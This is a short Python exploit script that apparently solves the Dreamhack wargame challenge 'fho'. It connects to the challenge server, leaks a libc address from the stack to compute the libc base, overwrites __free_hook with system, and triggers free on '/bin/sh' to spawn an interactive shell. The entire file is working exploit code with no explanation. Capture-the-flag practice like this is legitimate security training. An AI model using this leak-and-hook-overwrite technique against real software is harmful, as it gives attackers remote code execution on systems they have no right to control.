from pwn import *

def slog(name, addr): 
    return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 9810)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

buf = b'A' * 0x48
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00' * 2)
lb = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)

system = lb + libc.symbols['system']
free_hook = lb + libc.symbols['__free_hook']
binsh = lb + next(libc.search(b'/bin/sh'))

slog('libc_base', lb)
slog('system', system)
slog('__free_hook', free_hook)
slog('/bin/sh', binsh)

p.sendlineafter(b'To write: ', str(free_hook).encode())
p.sendlineafter(b'With: ', str(system).encode())
p.sendlineafter(b'To free: ', str(binsh).encode())

p.interactive()